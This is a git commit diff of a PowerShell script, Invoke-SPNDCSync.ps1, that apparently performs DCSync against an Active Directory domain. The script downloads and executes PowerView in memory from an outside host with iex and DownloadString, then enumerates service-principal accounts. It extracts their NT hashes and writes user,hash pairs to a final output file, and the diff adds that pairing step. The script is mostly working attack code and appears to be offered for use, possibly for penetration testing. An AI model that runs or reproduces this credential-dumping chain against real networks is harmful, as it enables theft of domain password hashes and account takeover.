998f1e6734a7c663328e39a5c16f57d19b7aa1a2
LRVT <21357789+l4rm4nd@users.noreply.github.com>
2022-02-14 11:51:12 +0100

    Update Invoke-SPNDCSync.ps1

--- Invoke-SPNDCSync.ps1
+++ Invoke-SPNDCSync.ps1
@@ -1,3 +1,7 @@
+# CHECK WRITE PERMISSIONS ON CURRENT DIR
+Try { [io.file]::OpenWrite('justatestfile.txt').close() }
+Catch { Write-Warning "Unable to write to output file. Please change directory!"; break}
+
 # LOAD POWERVIEW INTO MEMORY
 iex(new-Object Net.WebClient).DownloadString('https://lrvt.de/dl/PowerView.ps1');Get-NetDomain;
 
@@ -12,6 +16,7 @@ Get-DomainUser -SPN | Select-Object -property samaccountname | foreach { $_.sama
 $DATE = $(get-date -f yyyyMMddThhmm)
 $LOG = $DATE + "_" + "DCSync_NTLM_full.txt"
 $LOGSPN = $DATE + "_" + "DCSYNC_SPN_NTHASH.txt"
+$LOGFIN = $DATE + "_" + "DCSync_NTLM_UserHash_FINAL.txt"
 $DOMAIN = get-netdomain | Select-Object -property Name | foreach { $_.Name}
 
 write-host "[!!!] DCSync will be executed on" $DOMAIN -ForegroundColor Red
@@ -28,13 +33,21 @@ get-content $LOG -ReadCount 1000 |
     foreach { $_ -match $spn } >> $LOGSPN
 }
 
-# get NTLM only
+# GET NT-HASHES ONLY
 $HASHES = $DATE + "_" + "SPN_Hashes_Only_FINAL.txt"
 (Get-Content -LiteralPath $LOGSPN) -notmatch '\$' | ForEach-Object {$_.Split("`t")[2]} > $HASHES
 
-# get users only
+# GET USERS ONLY
 $USERS = $DATE + "_" + "SPN_Users_Only_FINAL.txt"
 (Get-Content -LiteralPath $LOGSPN) -notmatch '\$' | ForEach-Object {$_.Split("`t")[1]} > $USERS
+
+# CONCAT USER AND NT-HASH INTO OUTFILE
+$File1 = Get-Content $USERS
+$File2 = Get-Content $HASHES
+for($i = 0; $i -lt $File1.Count; $i++)
+{
+    ('{0},{1}' -f $File1[$i],$File2[$i]) |Add-Content $LOGFIN
+}
 
 # VERIFY AMOUNT OF SPN AND DSYNCED SPNS
 write-host "Found SPNs:" (Get-Content "spnuser_samaccountname.txt" | Select-Object -property samaccountname | foreach { $_.samaccountname }).Length "(minus 1 for Guest account)" -ForegroundColor Red; write-host "DCsynced SPNs:" (Get-Content $LOGSPN).Length -ForegroundColor Red
